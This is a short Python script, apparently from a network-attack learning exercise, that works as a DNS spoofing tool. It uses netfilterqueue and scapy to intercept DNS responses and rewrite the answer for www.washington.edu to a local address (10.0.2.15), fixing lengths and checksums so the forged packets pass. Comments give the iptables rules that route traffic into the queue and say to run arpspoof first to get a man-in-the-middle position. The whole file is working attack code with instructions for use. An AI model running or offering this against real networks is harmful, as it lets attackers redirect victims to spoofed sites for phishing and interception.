
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet=scapy.IP(packet.get_payload())#converting packet to scapy packet
	if scapy_packet.haslayer(scapy.DNSRR):
		qname=scapy_packet[scapy.DNSQR].qname
		if "www.washington.edu" in qname:
			#use any site that is using http
			ans=scapy.DNSRR(rrname=qname,rdata="10.0.2.15")
			scapy_packet[scapy.DNS].an=ans
			scapy_packet[scapy.DNS].ancount=1
			
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			
			packet.set_payload(str(scapy_packet))
				
			#print(scapy_packet.show())
			#generate dns req by ping -c 1 www.bing.com
			#print(packet.get_payload())
	#packet.drop() to drop a packet and not to pass on
	packet.accept() 
	#to pass packet to server



queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run() 

#install library netfilterqueue 
#pip install netfilterqueue
#changes in iptable command
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 
# iptables -I INPUT -j NFQUEUE --queue-num 0
# to test it in your pc run above 2 commands
#run arpspoof then this program
#in the end run iptables --flush
